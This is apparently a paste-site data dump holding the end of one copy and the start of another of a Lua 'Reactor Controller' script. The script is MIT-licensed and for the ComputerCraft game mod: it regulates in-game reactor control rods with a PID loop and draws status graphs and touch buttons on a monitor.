    t:add(name, callBack,
            xoff + 1, yoff + 1,
            size[1] + xoff, size[2] + yoff,
            color1, color2)
end

local function minAdd10()
    minb = math.min(maxb - 10, minb + 10)
end
local function minSub10()
    minb = math.max(0, minb - 10)
end
local function maxAdd10()
    maxb = math.min(100, maxb + 10)
end
local function maxSub10()
    maxb = math.max(minb + 10, maxb - 10)
end

local function turnOff()
    if (btnOn) then
        t:toggleButton(""Off"")
        t:toggleButton(""On"")
        btnOff = true
        btnOn = false
        reactor.setActive(false)
    end
end

local function turnOn()
    if (btnOff) then
        t:toggleButton(""Off"")
        t:toggleButton(""On"")
        btnOff = false
        btnOn = true
        reactor.setActive(true)
    end
end

--adds buttons
local function addButtons()
    if (sizey == 24) then
        oo = 1
    end
    addButt(""On"", turnOn, {8, 3}, dim + 7, 3 + oo,
            colors.red, colors.lime)
    addButt(""Off"", turnOff, {8, 3}, dim + 19, 3 + oo,
            colors.red, colors.lime)
    if (btnOn) then
        t:toggleButton(""On"", true)
    else
        t:toggleButton(""Off"", true)
    end
    if (sizey > 24) then
        addButt(""+ 10"", minAdd10, {8, 3}, dim + 7, 14 + oo,
                colors.purple, colors.pink)
        addButt("" + 10 "", maxAdd10, {8, 3}, dim + 19, 14 + oo,
                colors.magenta, colors.pink)
        addButt(""- 10"", minSub10, {8, 3}, dim + 7, 18 + oo,
                colors.purple, colors.pink)
        addButt("" - 10 "", maxSub10, {8, 3}, dim + 19, 18 + oo,
                colors.magenta, colors.pink)
    end
end

--Resets the monitor
local function resetMon()
    if (monSide == nil) then
        return
    end
    mon.setBackgroundColor(colors.black)
    mon.clear()
    mon.setTextScale(0.5)
    mon.setCursorPos(1,1)
end

local function getPercPower()
    return averageStoredThisTick / capacity * 100
end

local function rnd(num, dig)
    return math.floor(10 ^ dig * num) / (10 ^ dig)
end

local function getEfficiency()
    return averageLastRFT / averageFuelUsage
end

local function format(num)
    if (num >= 1000000000) then
        return string.format(""%7.3f G"", num / 1000000000)
    elseif (num >= 1000000) then
        return string.format(""%7.3f M"", num / 1000000)
    elseif (num >= 1000) then
        return string.format(""%7.3f K"", num / 1000)
    elseif (num >= 1) then
        return string.format(""%7.3f "", num)
    elseif (num >= .001) then
        return string.format(""%7.3f m"", num * 1000)
    elseif (num >= .000001) then
        return string.format(""%7.3f u"", num * 1000000)
    else
        return string.format(""%7.3f "", 0)
    end
end


local function getAvailableXOff()
    for i,v in pairs(XOffs) do
        if (v[2] and v[1] < dim) then
            v[2] = false
            return v[1]
        end
    end
    return -1
end

local function getXOff(num)
    for i,v in pairs(XOffs) do
        if (v[1] == num) then
            return v
        end
    end
    return nil
end

local function enableGraph(name)
    if (graphsToDraw[name] ~= nil) then
        return
    end
    local e = getAvailableXOff()
    if (e ~= -1) then
        graphsToDraw[name] = e
        if (displayingGraphMenu) then
            t:toggleButton(name)
        end
    end
end

local function disableGraph(name)
    if (graphsToDraw[name] == nil) then
        return
    end
    if (displayingGraphMenu) then
        t:toggleButton(name)
    end
    getXOff(graphsToDraw[name])[2] = true
    graphsToDraw[name] = nil
end

local function toggleGraph(name)
    if (graphsToDraw[name] == nil) then
        enableGraph(name)
    else
        disableGraph(name)
    end
end

local function addGraphButtons()
    offy = oo - 14
    for i,v in pairs(graphs) do
        addButt(v, function() toggleGraph(v) end, {20, 3},
                dim + 7, offy + i * 3 - 1,
                colors.red, colors.lime)
        if (graphsToDraw[v] ~= nil) then
            t:toggleButton(v, true)
        end
    end
end

local function drawGraphButtons()
    drawBox({sizex - dim - 3, oo - offy - 1},
            dim + 2, offy, colors.orange)
    drawText("" Graph Controls "",
            dim + 7, offy + 1,
            colors.black, colors.orange)
end

local function drawEnergyBuffer(xoff)
    local srf = sizey - 9
    local off = xoff
    local right = off + 19 < dim
    local poff = right and off + 15 or off - 6

    drawBox({15, srf + 2}, off - 1, 4, colors.gray)
    local pwr = math.floor(getPercPower() / 100
            * (srf))
    drawFilledBox({13, srf}, off, 5,
            colors.red, colors.red)
    local rndpw = rnd(getPercPower(), 2)
    local color = (rndpw < maxb and rndpw > minb) and colors.green
            or (rndpw >= maxb and colors.orange or colors.blue)
    if (pwr > 0) then
        drawFilledBox({13, pwr + 1}, off, srf + 4 - pwr,
                color, color)
    end
    --drawPoint(off + 14, srf + 5 - pwr, pwr > 0 and color or colors.red)
    drawText(string.format(right and ""%.2f%%"" or ""%5.2f%%"", rndpw), poff, srf + 5 - pwr,
            colors.black, color)
    drawText(""Energy Buffer"", off + 1, 4,
            colors.black, colors.orange)
    drawText(format(averageStoredThisTick)..""RF"", off + 1, srf + 5 - pwr,
            pwr > 0 and color or colors.red, colors.black)
end

local function drawControlLevel(xoff)
    local srf = sizey - 9
    local off = xoff
    drawBox({15, srf + 2}, off - 1, 4, colors.gray)
    drawFilledBox({13, srf}, off, 5,
            colors.yellow, colors.yellow)
    local rodTr = math.floor(averageRod / 100
            * (srf))
    drawText(""Control Level"", off + 1, 4,
            colors.black, colors.orange)
    if (rodTr > 0) then
        drawFilledBox({9, rodTr}, off + 2, 5,
                colors.white, colors.white)
    end
    drawText(string.format(""%6.2f%%"", averageRod), off + 4, rodTr > 0 and rodTr + 5 or 6,
            rodTr > 0 and colors.white or colors.yellow, colors.black)

end

local function drawTemperatures(xoff)
    local srf = sizey - 9
    local off = xoff
    drawBox({15, srf + 2}, off, 4, colors.gray)
    --drawFilledBox({12, srf}, off, 5,
    --	colors.red, colors.red)

    local tempUnit = (reactorVersion == ""Bigger Reactors"") and ""K"" or ""C""
    local tempFormat = ""%4s""..tempUnit

    local fuelRnd = math.floor(averageFuelTemp)
    local caseRnd = math.floor(averageCaseTemp)
    local fuelTr = math.floor(fuelRnd / 2000
            * (srf))
    local caseTr = math.floor(caseRnd / 2000
            * (srf))
    drawText("" Case "", off + 2, 5,
            colors.gray, colors.lightBlue)
    drawText("" Fuel "", off + 9, 5,
            colors.gray, colors.magenta)
    if (fuelTr > 0) then
        fuelTr = math.min(fuelTr, srf)
        drawFilledBox({6, fuelTr}, off + 8, srf + 5 - fuelTr,
                colors.magenta, colors.magenta)

        drawText(string.format(tempFormat, fuelRnd..""""),
                off + 10, srf + 6 - fuelTr,
                colors.magenta, colors.black)
    else
        drawText(string.format(tempFormat, fuelRnd..""""),
                off + 10, srf + 5,
                colors.black, colors.magenta)
    end

    if (caseTr > 0) then
        caseTr = math.min(caseTr, srf)
        drawFilledBox({6, caseTr}, off + 1, srf + 5 - caseTr,
                colors.lightBlue, colors.lightBlue)
        drawText(string.format(tempFormat, caseRnd..""""),
                off + 3, srf + 6 - caseTr,
                colors.lightBlue, colors.black)
    else
        drawText(string.format(tempFormat, caseRnd..""""),
                off + 3, srf + 5,
                colors.black, colors.lightBlue)
    end

    drawText(""Temperatures"", off + 2, 4,
            colors.black, colors.orange)
    drawBox({1, srf}, off + 7, 5,
            colors.gray)
end

local function drawGraph(name, offset)
    if (name == ""Energy Buffer"") then
        drawEnergyBuffer(offset)
    elseif (name == ""Control Level"") then
        drawControlLevel(offset)
    elseif (name == ""Temperatures"") then
        drawTemperatures(offset)
    end
end

local function drawGraphs()
    for i,v in pairs(graphsToDraw) do
        if (v + 15 < dim) then
            drawGraph(i,v)
        end
    end
end

local function drawStatus()
    if (dim <= -1) then
        return
    end
    drawBox({dim, sizey - 2},
            1, 1, colors.lightBlue)
    drawText("" Reactor Graphs "", dim - 18, 2,
            colors.black, colors.lightBlue)
    drawGraphs()
end

local function drawControls()
    if (sizey == 24) then
        drawBox({sizex - dim - 3, 9}, dim + 2, oo,
                colors.cyan)
        drawText("" Reactor Controls "", dim + 7, oo + 1,
                colors.black, colors.cyan)
        drawText(""Reactor ""..(btnOn and ""Online"" or ""Offline""),
                dim + 10, 3 + oo,
                colors.black, btnOn and colors.green or colors.red)
        return
    end

    drawBox({sizex - dim - 3, 23}, dim + 2, oo,
            colors.cyan)
    drawText("" Reactor Controls "", dim + 7, oo + 1,
            colors.black, colors.cyan)
    drawFilledBox({20, 3}, dim + 7, 8 + oo,
            colors.red, colors.red)
    drawFilledBox({(maxb - minb) / 5, 3},
            dim + 7 + minb / 5, 8 + oo,
            colors.green, colors.green)
    drawText(string.format(""%3s"", minb..""%""), dim + 6 + minb / 5, 12 + oo,
            colors.black, colors.purple)
    drawText(maxb..""%"", dim + 8 + maxb / 5, 12 + oo,
            colors.black, colors.magenta)
    drawText(""Buffer Target Range"", dim + 8, 8 + oo,
            colors.black, colors.orange)
    drawText(""Min"", dim + 10, 14 + oo,
            colors.black, colors.purple)
    drawText(""Max"", dim + 22, 14 + oo,
            colors.black, colors.magenta)
    drawText(""Reactor "".. (btnOn and ""Online"" or ""Offline""),
            dim + 10, 3 + oo,
            colors.black, btnOn and colors.green or colors.red)
end

local function drawStatistics()
    local oS = sizey - 13
    drawBox({sizex - dim - 3, sizey - oS - 1}, dim + 2, oS,
            colors.blue)
    drawText("" Reactor Statistics "", dim + 7, oS + 1,
            colors.black, colors.blue)

    --statistics
    drawText(""Generating : ""
            ..format(averageLastRFT)..""RF/t"", dim + 5, oS + 3,
            colors.black, colors.green)
    drawText(""RF Drain   ""
            ..(averageStoredThisTick <= averageLastRFT and ""> "" or "": "")
            ..format(averageRfLost)
            ..""RF/t"", dim + 5, oS + 5,
            colors.black, colors.red)
    drawText(""Efficiency : ""
            ..format(getEfficiency())..""RF/B"",
            dim + 5, oS + 7,
            colors.black, colors.green)
    drawText(""Fuel Usage : ""
            ..format(averageFuelUsage)
            ..""B/t"", dim + 5, oS + 9,
            colors.black, colors.green)
    drawText(""Waste      : ""
            ..string.format(""%7d mB"", waste),
            dim + 5, oS + 11,
            colors.black, colors.green)
end

--Draw a scene
local function drawScene()
    if (monSide == nil) then
        return
    end
    if (invalidDim) then
        mon.write(""Invalid Monitor Dimensions"")
        return
    end

    if (displayingGraphMenu) then
        drawGraphButtons()
    end
    drawControls()
    drawStatus()
    drawStatistics()
    t:draw()
end

--returns the side that a given peripheral type is connected to
local function getPeripheral(name)
    for i,v in pairs(peripheral.getNames()) do
        if (peripheral.getType(v) == name) then
            return v
        end
    end
    return """"
end

--Creates all the buttons and determines monitor size
local function initMon()
    monSide = getPeripheral(""monitor"")
    if (monSide == nil or monSide == """") then
        monSide = nil
        return
    end

    mon = peripheral.wrap(monSide)

    if mon == nil then
        monSide = nil
        return
    end

    resetMon()
    t = touchpoint.new(monSide)
    sizex, sizey = mon.getSize()
    oo = sizey - 37
    dim = sizex - 33

    if (sizex == 36) then
        dim = -1
    end
    if (pcall(addGraphButtons)) then
        displayingGraphMenu = true
    else
        t = touchpoint.new(monSide)
        displayingGraphMenu = false
    end
    local rtn = pcall(addButtons)
    if (not rtn) then
        t = touchpoint.new(monSide)
        invalidDim = true
    else
        invalidDim = false
    end
end

local lastSetRodLevel = nil
local function setRods(level)
    level = math.max(level, 0)
    level = math.min(level, 100)
    -- Smoothing: move toward target by max % per update
    local maxDelta = 5       -- Max percent rod change per update (tune as needed)
    if lastSetRodLevel == nil then
        lastSetRodLevel = level     -- First frame, accept whatever is given
    else
        -- Move toward 'level' by maxDelta
        local diff = level - lastSetRodLevel
        if math.abs(diff) > maxDelta then
            if diff > 0 then
                lastSetRodLevel = lastSetRodLevel + maxDelta
            else
                lastSetRodLevel = lastSetRodLevel - maxDelta
            end
        else
            lastSetRodLevel = level
        end
    end
    reactor.setAllControlRodLevels(math.floor(lastSetRodLevel + 0.5))
end

local function lerp(start, finish, t)
    -- Ensure t is in the range [0, 1]
    t = math.max(0, math.min(1, t))

    -- Calculate the linear interpolation
    return (1 - t) * start + t * finish
end

-- Function to calculate the average of an array of values
local function calculateAverage(array)
    local sum = 0
    for _, value in ipairs(array) do
        sum = sum + value
    end
    return sum / #array
end

-- Define PID controller parameters
local pid = {
    setpointRFT = 0,      -- Target RFT
    setpointRF = 0,      -- Target RF
    Kp = -.04,           -- Proportional gain
    Ki = -.0005,          -- Integral gain
    Kd = -.003,         -- Derivative gain
    integral = 0,       -- Integral term accumulator
    lastError = 0,      -- Last error for derivative term
}

local function iteratePID(pid, error)
    -- Proportional term
    local P = pid.Kp * error

    -- Integral term (anti-windup: integrate error, not output)
    pid.integral = pid.integral + error
    -- Clamp integral to prevent windup
    pid.integral = math.max(math.min(pid.integral, 2000), -2000)

    local I = pid.Ki * pid.integral

    -- Derivative term
    local derivative = error - pid.lastError
    local D = pid.Kd * derivative

    -- PID sum, clamp to rod range
    local pid_output = P + I + D
    local rodLevel = math.max(math.min(pid_output, 100), 0)

    -- Save for next derivative
    pid.lastError = error

    return rodLevel
end

local function updateRods()
    if (not btnOn) then
        return
    end
    local currentRF = storedThisTick
    local diffb = maxb - minb
    local minRF = minb / 100 * capacity
    local diffRF = diffb / 100 * capacity
    local diffr = diffb / 100
    local targetRFT = rfLost
    local currentRFT = lastRFT
    local targetRF = diffRF / 2 + minRF

    pid.setpointRFT = targetRFT
    pid.setpointRF = targetRF / capacity * 1000

    local errorRFT = pid.setpointRFT - currentRFT
    local errorRF = pid.setpointRF - currentRF / capacity * 1000

    local W_RFT = lerp(1, 0, (math.abs(targetRF - currentRF) / capacity / (diffr / 4)))
    W_RFT = math.max(math.min(W_RFT, 1), 0)

    local W_RF = (1 - W_RFT)  -- Adjust the weight for energy error

    -- Combine the errors with weights
    local combinedError = W_RFT * errorRFT + W_RF * errorRF
    local error = combinedError

	if math.abs(error) < 1.0 then
        return  -- No rod update needed
    end

    local rftRodLevel = iteratePID(pid, error)

    -- Set control rod levels
    setRods(rftRodLevel)
end

-- Saves the configuration of the reactor controller
local function saveToConfig()
    local file = fs.open(tag..""Serialized.txt"", ""w"")
    local configs = {
        maxb = maxb,
        minb = minb,
        rod = rod,
        btnOn = btnOn,
        graphsToDraw = graphsToDraw,
        XOffs = XOffs,
    }
    local serialized = textutils.serialize(configs)
    file.write(serialized)
    file.close()
end

local storedThisTickValues = {}
local lastRFTValues = {}
local rodValues = {}
local fuelUsageValues = {}
local wasteValues = {}
local fuelTempValues = {}
local caseTempValues = {}
local rfLostValues = {}

local function updateStats()
    storedLastTick = storedThisTick
    if (reactorVersion == ""Big Reactors"") then
        storedThisTick = reactor.getEnergyStored()
        lastRFT = reactor.getEnergyProducedLastTick()
        rod = reactor.getControlRodLevel(0)
        fuelUsage = reactor.getFuelConsumedLastTick() / 1000
        waste = reactor.getWasteAmount()
        fuelTemp = reactor.getFuelTemperature()
        caseTemp = reactor.getCasingTemperature()
        -- Big Reactors doesn't give us a way to directly query RF capacity through CC APIs
        capacity = math.max(capacity, reactor.getEnergyStored)
    elseif (reactorVersion == ""Extreme Reactors"") then
        local bat = reactor.getEnergyStats()
        local fuel = reactor.getFuelStats()

        storedThisTick = bat.energyStored
        lastRFT = bat.energyProducedLastTick
        capacity = bat.energyCapacity
        rod = reactor.getControlRodLevel(0)
        fuelUsage = fuel.fuelConsumedLastTick / 1000
        waste = reactor.getWasteAmount()
        fuelTemp = reactor.getFuelTemperature()
        caseTemp = reactor.getCasingTemperature()
    elseif (reactorVersion == ""Bigger Reactors"") then
        storedThisTick = reactor.battery().stored()
        lastRFT = reactor.battery().producedLastTick()
        capacity = reactor.battery().capacity()
        rod = reactor.getControlRod(0).level()
        fuelUsage = reactor.fuelTank().burnedLastTick() / 1000
        waste = reactor.fuelTank().waste()
        fuelTemp = reactor.fuelTemperature()
        caseTemp = reactor.casingTemperature()
    end
    rfLost = lastRFT + storedLastTick - storedThisTick
    -- Add the values to the arrays
    table.insert(storedThisTickValues, storedThisTick)
    table.insert(lastRFTValues, lastRFT)
    table.insert(rodValues, rod)
    table.insert(fuelUsageValues, fuelUsage)
    table.insert(wasteValues, waste)
    table.insert(fuelTempValues, fuelTemp)
    table.insert(caseTempValues, caseTemp)
    table.insert(rfLostValues, rfLost)

    local maxIterations = 20 * secondsToAverage
    while #storedThisTickValues > maxIterations do
        table.remove(storedThisTickValues, 1)
        table.remove(lastRFTValues, 1)
        table.remove(rodValues, 1)
        table.remove(fuelUsageValues, 1)
        table.remove(wasteValues, 1)
        table.remove(fuelTempValues, 1)
        table.remove(caseTempValues, 1)
        table.remove(rfLostValues, 1)
    end

    -- Calculate running averages
    averageStoredThisTick = calculateAverage(storedThisTickValues)
    averageLastRFT = calculateAverage(lastRFTValues)
    averageRod = calculateAverage(rodValues)
    averageFuelUsage = calculateAverage(fuelUsageValues)
    averageWaste = calculateAverage(wasteValues)
    averageFuelTemp = calculateAverage(fuelTempValues)
    averageCaseTemp = calculateAverage(caseTempValues)
    averageRfLost = calculateAverage(rfLostValues)
end

--Initialize variables from either a config file or the defaults
local function loadFromConfig()
    invalidDim = false
    local legacyConfigExists = fs.exists(tag.."".txt"")
    local newConfigExists = fs.exists(tag..""Serialized.txt"")
    if (newConfigExists) then
        local file = fs.open(tag..""Serialized.txt"", ""r"")
        print(""Config file ""..tag..""Serialized.txt found! Using configurated settings"")

        local serialized = file.readAll()
        local deserialized = textutils.unserialise(serialized)
        
        maxb = deserialized.maxb
        minb = deserialized.minb
        rod = deserialized.rod
        btnOn = deserialized.btnOn
        graphsToDraw = deserialized.graphsToDraw
        XOffs = deserialized.XOffs
    elseif (legacyConfigExists) then
        local file = fs.open(tag.."".txt"", ""r"")
        local calibrated = file.readLine() == ""true""

        --read calibration information
        if (calibrated) then
            _ = tonumber(file.readLine())
            _ = tonumber(file.readLine())
        end
        maxb = tonumber(file.readLine())
        minb = tonumber(file.readLine())
        rod = tonumber(file.readLine())
        btnOn = file.readLine() == ""true""

        --read Graph data
        for i in pairs(XOffs) do
            local graph = file.readLine()
            local v1 = tonumber(file.readLine())
            local v2 = true
            if (graph ~= ""nil"") then
                v2 = false
                graphsToDraw[graph] = v1
            end

            XOffs[i] = {v1, v2}

        end
        file.close()
    else
        print(""Config file not found, generating default settings!"")

        maxb = 70
        minb = 30
        rod = 80
        btnOn = false
        if (monSide == nil) then
            btnOn = true
        end
        sizex, sizey = 100, 52
        dim = sizex - 33
        oo = sizey - 37
        enableGraph(""Energy Buffer"")
        enableGraph(""Control Level"")
        enableGraph(""Temperatures"")
    end
    btnOff = not btnOn
    reactor.setActive(btnOn)
end

local function startTimer(ticksToUpdate, callback)
    local timeToUpdate = ticksToUpdate * 0.05
    local id = os.startTimer(timeToUpdate)
    local fun = function(event)
        if (event[1] == ""timer"" and event[2] == id) then
            id = os.startTimer(timeToUpdate)
            callback()
        end
    end
    return fun
end


-- Main loop, handles all the events
local function loop()
    local ticksToUpdateStats = 1
    local ticksToRedraw = 4
    
    local hasClicked = false

    local updateStatsTick = startTimer(
        ticksToUpdateStats,
        function()
            updateStats()
            updateRods()
        end
    )
    local redrawTick = startTimer(
        ticksToRedraw,
        function()
            if (not hasClicked) then
                resetMon()
                drawScene()
            end
            hasClicked = false
        end
    )
    local handleResize = function(event)
        if (event[1] == ""monitor_resize"") then
            initMon()
        end
    end
    local handleClick = function(event)
        if (event[1] == ""button_click"") then
			t.buttonList[event[2]].func()
            saveToConfig()
            resetMon()
            drawScene()
            hasClicked = true
        end
    end
    while (true) do
        local event = (monSide == nil) and { os.pullEvent() } or { t:handleEvents() }

        updateStatsTick(event)
        redrawTick(event)
        handleResize(event)
        handleClick(event)
    end
end

local function detectReactor()
    -- Bigger Reactors V1.
    local reactor_bigger_v1 = getPeripheral(""bigger-reactor"")
    reactor = reactor_bigger_v1 ~= nil and peripheral.wrap(reactor_bigger_v1)
    if (reactor ~= nil) then
        reactorVersion = ""Bigger Reactors""
        return true
    end

    -- Bigger Reactors V2
    local reactor_bigger_v2 = getPeripheral(""BiggerReactors_Reactor"")
    reactor = reactor_bigger_v2 ~= nil and peripheral.wrap(reactor_bigger_v2)
    if (reactor ~= nil) then
        reactorVersion = ""Bigger Reactors""
        return true
    end

    -- Big Reactors or Extreme Reactors
    local reactor_extreme_or_big = getPeripheral(""BigReactors-Reactor"")
    reactor = reactor_extreme_or_big ~= nil and peripheral.wrap(reactor_extreme_or_big)
    if (reactor ~= nil) then
        reactorVersion = (reactor.mbIsConnected ~= nil) and ""Extreme Reactors"" or ""Big Reactors""
        return true
    end
    return false
end

--Entry point
local function main()
    term.setBackgroundColor(colors.black)
    term.clear()
    term.setCursorPos(1,1)

    local reactorDetected = false
    while (not reactorDetected) do
        reactorDetected = detectReactor()
        if (not reactorDetected) then
            print(""Reactor not detected! Trying again..."")
            sleep(1)
        end
    end
    
    print(""Reactor detected! Proceeding with initialization "")

    print(""Loading config..."")
    loadFromConfig()
    print(""Initializing monitor if connected..."")
    initMon()
    print(""Writing config to disk..."")
    saveToConfig()
    print(""Reactor initialization done! Starting controller"")
    sleep(2)

    term.clear()
    term.setCursorPos(1,1)
    print(""Reactor Controller Version ""..version)
    print(""Reactor Mod: ""..reactorVersion)
    --main loop

    loop()
end

main()

print(""script exited"")
sleep(1)"
1npuJRXY,Reactor Controller,emulackle,Lua,Wednesday 23rd of April 2025 06:10:01 PM CDT,"local version = ""0.61""
local tag = ""reactorConfig""
--[[
Program made by DrunkenKas
	See github: https://github.com/Kasra-G/ReactorController/#readme

The MIT License (MIT)
 
Copyright (c) 2021 Kasra Ghaffari

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the ""Software""), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:
 
The above copyright notice and this permission notice shall be included in
all copies or substantial portions of the Software.
 
THE SOFTWARE IS PROVIDED ""AS IS"", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
THE SOFTWARE.
]]

dofile(""/usr/apis/touchpoint.lua"")

local reactorVersion, reactor
local mon, monSide
local sizex, sizey, dim, oo, offy
local btnOn, btnOff, invalidDim
local minb, maxb
local rod, rfLost
local storedLastTick, storedThisTick, lastRFT = 0,0,0
local fuelTemp, caseTemp, fuelUsage, waste, capacity = 0,0,0,0,1
local t
local displayingGraphMenu = false

local secondsToAverage = 2

local averageStoredThisTick = 0
local averageLastRFT = 0
local averageRod = 0
local averageFuelUsage = 0
local averageWaste = 0
local averageFuelTemp = 0
local averageCaseTemp = 0
local averageRfLost = 0

-- table of which graphs to draw
local graphsToDraw = {}

-- table of all the graphs
local graphs =
{
    ""Energy Buffer"",
    ""Control Level"",
    ""Temperatures"",
}

-- marks the offsets for each graph position
-- { XOffset, <is_available> }
local XOffs =
{
    { 4, true},
    {27, true},
    {50, true},
    {73, true},
    {96, true},
}

-- Draw a box with no fill
local function drawBox(size, xoff, yoff, color)
    if (monSide == nil) then
        return
    end
    local x,y = mon.getCursorPos()
    mon.setBackgroundColor(color)
    local horizLine = string.rep("" "", size[1])
    mon.setCursorPos(xoff + 1, yoff + 1)
    mon.write(horizLine)
    mon.setCursorPos(xoff + 1, yoff + size[2])
    mon.write(horizLine)

    -- Draw vertical lines
    for i=0, size[2] - 1 do
        mon.setCursorPos(xoff + 1, yoff + i + 1)
        mon.write("" "")
        mon.setCursorPos(xoff + size[1], yoff + i +1)
        mon.write("" "")
    end
    mon.setCursorPos(x,y)
    mon.setBackgroundColor(colors.black)
end

--Draw a filled box
local function drawFilledBox(size, xoff, yoff, colorOut, colorIn)
    if (monSide == nil) then
        return
    end
    local horizLine = string.rep("" "", size[1] - 2)
    drawBox(size, xoff, yoff, colorOut)
    local x,y = mon.getCursorPos()
    mon.setBackgroundColor(colorIn)
    for i=2, size[2] - 1 do
        mon.setCursorPos(xoff + 2, yoff + i)
        mon.write(horizLine)
    end
    mon.setBackgroundColor(colors.black)
    mon.setCursorPos(x,y)
end

--Draws text on the screen
local function drawText(text, x1, y1, backColor, textColor)
    if (monSide == nil) then
        return
    end
    local x, y = mon.getCursorPos()
    mon.setCursorPos(x1, y1)
    mon.setBackgroundColor(backColor)
    mon.setTextColor(textColor)
    mon.write(text)
    mon.setTextColor(colors.white)
    mon.setBackgroundColor(colors.black)
    mon.setCursorPos(x,y)
end

--Helper method for adding buttons
local function addButt(name, callBack, size, xoff, yoff, color1, color2)
    t:add(name, callBack,
            xoff + 1, yoff + 1,
            size[1] + xoff, size[2] + yoff,
            color1, color2)
end

local function minAdd10()
    minb = math.min(maxb - 10, minb + 10)
end
local function minSub10()
    minb = math.max(0, minb - 10)
end
local function maxAdd10()
    maxb = math.min(100, maxb + 10)
end
local function maxSub10()
    maxb = math.max(minb + 10, maxb - 10)
end

local function turnOff()
    if (btnOn) then
        t:toggleButton(""Off"")
        t:toggleButton(""On"")
        btnOff = true
        btnOn = false
        reactor.setActive(false)
    end
end

local function turnOn()
    if (btnOff) then
        t:toggleButton(""Off"")
        t:toggleButton(""On"")
        btnOff = false
        btnOn = true
        reactor.setActive(true)
    end
end

--adds buttons
local function addButtons()
    if (sizey == 24) then
        oo = 1
    end
    addButt(""On"", turnOn, {8, 3}, dim + 7, 3 + oo,
            colors.red, colors.lime)
    addButt(""Off"", turnOff, {8, 3}, dim + 19, 3 + oo,
            colors.red, colors.lime)
    if (btnOn) then
        t:toggleButton(""On"", true)
    else
        t:toggleButton(""Off"", true)
    end
    if (sizey > 24) then
        addButt(""+ 10"", minAdd10, {8, 3}, dim + 7, 14 + oo,
                colors.purple, colors.pink)
        addButt("" + 10 "", maxAdd10, {8, 3}, dim + 19, 14 + oo,
                colors.magenta, colors.pink)
        addButt(""- 10"", minSub10, {8, 3}, dim + 7, 18 + oo,
                colors.purple, colors.pink)
        addButt("" - 10 "", maxSub10, {8, 3}, dim + 19, 18 + oo,
                colors.magenta, colors.pink)
    end
end

--Resets the monitor
local function resetMon()
    if (monSide == nil) then
        return
    end
    mon.setBackgroundColor(colors.black)
    mon.clear()
    mon.setTextScale(0.5)
    mon.setCursorPos(1,1)
end

local function getPercPower()
    return averageStoredThisTick / capacity * 100
end

local function rnd(num, dig)
    return math.floor(10 ^ dig * num) / (10 ^ dig)
end

local function getEfficiency()
    return averageLastRFT / averageFuelUsage
end

local function format(num)
    if (num >= 1000000000) then
        return string.format(""%7.3f G"", num / 1000000000)
    elseif (num >= 1000000) then
        return string.format(""%7.3f M"", num / 1000000)
    elseif (num >= 1000) then
        return string.format(""%7.3f K"", num / 1000)
    elseif (num >= 1) then
        return string.format(""%7.3f "", num)
    elseif (num >= .001) then
        return string.format(""%7.3f m"", num * 1000)
    elseif (num >= .000001) then
        return string.format(""%7.3f u"", num * 1000000)
    else
        return string.format(""%7.3f "", 0)
    end
end


local function getAvailableXOff()
    for i,v in pairs(XOffs) do
        if (v[2] and v[1] < dim) then
            v[2] = false
            return v[1]
        end
    end
    return -1
end

local function getXOff(num)
    for i,v in pairs(XOffs) do
        if (v[1] == num) then
            return v
        end
    end
    return nil
end

local function enableGraph(name)
    if (graphsToDraw[name] ~= nil) then
        return
    end
    local e = getAvailableXOff()
    if (e ~= -1) then
        graphsToDraw[name] = e
        if (displayingGraphMenu) then
            t:toggleButton(name)
        end
    end
end

local function disableGraph(name)
    if (graphsToDraw[name] == nil) then
        return
    end
    if (displayingGraphMenu) then
        t:toggleButton(name)
    end
    getXOff(graphsToDraw[name])[2] = true
    graphsToDraw[name] = nil
end

local function toggleGraph(name)
    if (graphsToDraw[name] == nil) then
        enableGraph(name)
    else
        disableGraph(name)
    end
end

local function addGraphButtons()
    offy = oo - 14
    for i,v in pairs(graphs) do
        addButt(v, function() toggleGraph(v) end, {20, 3},
                dim + 7, offy + i * 3 - 1,
                colors.red, colors.lime)
        if (graphsToDraw[v] ~= nil) then
            t:toggleButton(v, true)
        end
    end
end

local function drawGraphButtons()
    drawBox({sizex - dim - 3, oo - offy - 1},
            dim + 2, offy, colors.orange)
    drawText("" Graph Controls "",
            dim + 7, offy + 1,
            colors.black, colors.orange)
end

local function drawEnergyBuffer(xoff)
    local srf = sizey - 9
    local off = xoff
    local right = off + 19 < dim
    local poff = right and off + 15 or off - 6

    drawBox({15, srf + 2}, off - 1, 4, colors.gray)
    local pwr = math.floor(getPercPower() / 100
            * (srf))
    drawFilledBox({13, srf}, off, 5,
            colors.red, colors.red)
    local rndpw = rnd(getPercPower(), 2)
    local color = (rndpw < maxb and rndpw > minb) and colors.green
            or (rndpw >= maxb and colors.orange or colors.blue)
    if (pwr > 0) then
        drawFilledBox({13, pwr + 1}, off, srf + 4 - pwr,
                color, color)
    end
    --drawPoint(off + 14, srf + 5 - pwr, pwr > 0 and color or colors.red)
    drawText(string.format(right and ""%.2f%%"" or ""%5.2f%%"", rndpw), poff, srf + 5 - pwr,
            colors.black, color)
    drawText(""Energy Buffer"", off + 1, 4,
            colors.black, colors.orange)
    drawText(format(averageStoredThisTick)..""RF"", off + 1, srf + 5 - pwr,
            pwr > 0 and color or colors.red, colors.black)
end

local function drawControlLevel(xoff)
    local srf = sizey - 9
    local off = xoff
    drawBox({15, srf + 2}, off - 1, 4, colors.gray)
    drawFilledBox({13, srf}, off, 5,
            colors.yellow, colors.yellow)
    local rodTr = math.floor(averageRod / 100
            * (srf))
    drawText(""Control Level"", off + 1, 4,
            colors.black, colors.orange)
    if (rodTr > 0) then
        drawFilledBox({9, rodTr}, off + 2, 5,
                colors.white, colors.white)
    end
    drawText(string.format(""%6.2f%%"", averageRod), off + 4, rodTr > 0 and rodTr + 5 or 6,
            rodTr > 0 and colors.white or colors.yellow, colors.black)

end

local function drawTemperatures(xoff)
    local srf = sizey - 9
